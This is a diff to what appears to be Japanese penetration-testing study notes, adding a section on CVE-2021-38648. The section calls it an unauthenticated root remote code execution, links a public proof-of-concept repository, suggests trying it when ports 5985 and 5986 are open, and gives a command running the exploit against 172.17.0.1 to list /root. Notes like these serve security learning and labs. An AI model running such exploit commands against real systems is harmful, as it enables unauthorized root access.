@@ -807,6 +807,17 @@ bash-4.4# id
 uid=0(root) gid=0(root) groups=0(root),1001(overlay)
 ```
 
+## CVE-2021-38648
+
+https://github.com/CyberMonitor/CVE-2021-38648
+
+- 認証不要のルートRCE
+- 5985, 5986 ポートが開いていたら試す価値がある。
+
+```sh
+python3 ./poc.py -t 172.17.0.1 -c 'ls -al /root'
+```
+
 ## DLL Hijacking
 
 https://tryhackme.com/room/dllhijacking
